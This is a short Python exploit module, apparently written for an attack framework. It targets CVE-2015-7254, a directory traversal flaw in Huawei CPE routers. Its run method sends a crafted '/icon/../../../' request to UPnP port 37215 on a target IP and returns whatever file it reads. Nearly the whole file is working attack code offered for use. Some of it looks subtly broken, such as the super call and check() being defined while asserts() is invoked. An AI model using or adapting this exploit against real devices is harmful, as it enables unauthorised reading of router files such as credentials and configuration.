from lib.interfaces.iexploit import IExploit
from modules.auxiliary.http import HTTP
from modules.auxiliary.message import Message


class Exploit(IExploit):
    def __init__(self):
        super(Exploit).__init__(
            "Remote arbitrary file read on Huawei",
            "Roberto Paleari and Aristide Fattori",
            "06/11/2015",
            "Yes",
            "Multiple Huawei CPE models are vulnerable to a directory traversal issue affecting an Internet-facing web port \
            (tcp/37215, on the tested devices). \
            This port is devoted to the UPnP service.",
            {"GitHub" : "https://github.com/ud2/advisories/tree/master/embedded/huawei/cve-2015-7254/"}
        )

    def check(self, path):
        if not path.startswith("/"):
            Message.critical("Error", "An absolute path is required")

    def run(self, path):
        self.asserts(path)

        url = "http://%s:37215/icon/../../../%s" % (self.IP, path)
        data = HTTP.fetchURL(url)

        return data
